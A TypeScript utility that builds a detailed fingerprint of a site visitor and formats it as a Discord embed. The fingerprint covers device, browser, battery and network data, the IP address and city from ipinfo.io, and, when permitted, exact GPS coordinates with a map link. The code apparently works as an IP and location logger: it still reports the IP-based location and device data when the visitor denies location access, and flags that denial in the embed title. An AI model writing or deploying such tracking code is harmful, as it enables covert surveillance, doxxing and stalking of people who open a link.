// utils/clientInfo.ts
// Utility to gather detailed client info for Discord embeds

export async function getClientInfo() {
  const nav = navigator as any;
  const scr = window.screen;
  const info: any = {
    userAgent: nav.userAgent,
    platform: nav.platform,
    language: nav.language,
    screen: `${scr.width}x${scr.height}`,
    colorDepth: `${scr.colorDepth}-bit`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    orientation: (scr.orientation && scr.orientation.type) || 'unknown',
    memory: nav.deviceMemory ? nav.deviceMemory + ' GB' : 'unknown',
    cpuCores: nav.hardwareConcurrency || 'unknown',
    battery: 'unknown',
    charging: 'unknown',
    networkType: nav.connection?.effectiveType || 'unknown',
    downlink: nav.connection?.downlink ? nav.connection.downlink + ' Mbps' : 'unknown',
    cookiesEnabled: nav.cookieEnabled ? 'Yes' : 'No',
    doNotTrack: nav.doNotTrack === '1' ? 'Yes' : 'No',
    referrer: document.referrer || 'None',
    page: window.location.href,
    browser: (() => {
      const ua = nav.userAgent;
      if (ua.includes('Edg/')) return 'Edge';
      if (ua.includes('Chrome/')) return 'Chrome';
      if (ua.includes('Firefox/')) return 'Firefox';
      if (ua.includes('Safari/')) return 'Safari';
      return 'Unknown';
    })(),
    os: (() => {
      const ua = nav.userAgent;
      if (ua.includes('Win')) return 'Windows';
      if (ua.includes('Mac')) return 'MacOS';
      if (ua.includes('Linux')) return 'Linux';
      if (ua.includes('Android')) return 'Android';
      if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
      return 'Unknown';
    })(),
    timestamp: new Date().toLocaleString(),
  };
  // Battery info (async)
  if (nav.getBattery) {
    try {
      const battery = await nav.getBattery();
      info.battery = battery.level * 100 + '%';
      info.charging = battery.charging ? 'Yes' : 'No';
    } catch {}
  }
  // IP/location info
  let ipinfo: any = {};
  try {
    const token = (import.meta.env && import.meta.env.VITE_IPINFO_TOKEN) ? import.meta.env.VITE_IPINFO_TOKEN : 'demo';
    const res = await fetch(`https://ipinfo.io/json?token=${token}`);
    if (res.ok) ipinfo = await res.json();
  } catch {}
  info.ipinfo = ipinfo;
  return info;
}

export function buildLocationEmbed(info: any, position: GeolocationPosition | null, granted: boolean) {
  const ipinfo = info.ipinfo || {};
  const getVal = (v: any) => (v === undefined || v === null || v === '' ? 'N/A' : v);
  const fields = [
    { name: 'Current URL', value: window.location.href, inline: false },
    { name: 'Country', value: getVal(ipinfo.country), inline: true },
    { name: 'Region', value: getVal(ipinfo.region), inline: true },
    { name: 'City', value: getVal(ipinfo.city), inline: true },
    { name: 'IP', value: getVal(ipinfo.ip), inline: true },
    { name: 'userAgent', value: '```' + info.userAgent + '```' },
    { name: 'platform', value: getVal(info.platform), inline: true },
    { name: 'language', value: getVal(info.language), inline: true },
    { name: 'screen', value: getVal(info.screen), inline: true },
    { name: 'timezone', value: getVal(info.timezone), inline: true },
    { name: 'browser', value: getVal(info.browser), inline: true },
    { name: 'os', value: getVal(info.os), inline: true },
    { name: 'Timestamp', value: getVal(info.timestamp), inline: true },
  ];
  let mapUrl = null;
  if (position) {
    const lat = position.coords.latitude;
    const lng = position.coords.longitude;
    fields.push(
      { name: 'Latitude', value: lat.toFixed(6), inline: true },
      { name: 'Longitude', value: lng.toFixed(6), inline: true },
      { name: 'Accuracy', value: getVal(position.coords.accuracy) + ' m', inline: true },
      { name: 'Altitude', value: position.coords.altitude !== null ? position.coords.altitude + ' m' : 'N/A', inline: true },
      { name: 'Heading', value: position.coords.heading !== null ? position.coords.heading + '°' : 'N/A', inline: true },
      { name: 'Speed', value: position.coords.speed !== null ? position.coords.speed + ' m/s' : 'N/A', inline: true },
    );
    mapUrl = `https://maps.google.com/?q=${lat},${lng}`;
    fields.push({ name: 'Map Link', value: `[Open in Google Maps](${mapUrl})`, inline: false });
  }
  // Note if IP/location fields are missing
  let desc = granted
    ? 'User granted location permission. Here is a detailed device/location info snapshot.'
    : 'User denied location permission. Here is a device/session info snapshot.';
  if (!ipinfo.ip || !ipinfo.country) {
    desc += '\n\n:warning: Some location fields are missing. This may be due to a missing or rate-limited ipinfo.io token.';
  }
  // Discord embed with button (if mapUrl)
  const embed: any = {
    title: granted ? '📍 Socket: Location Permission GRANTED' : '🚫 Socket: Location Permission DENIED',
    description: desc,
    color: granted ? 0x6fe07b : 0xff4f4f,
    fields,
    footer: { text: 'Socket' },
    timestamp: new Date().toISOString(),
  };

  return embed;
}

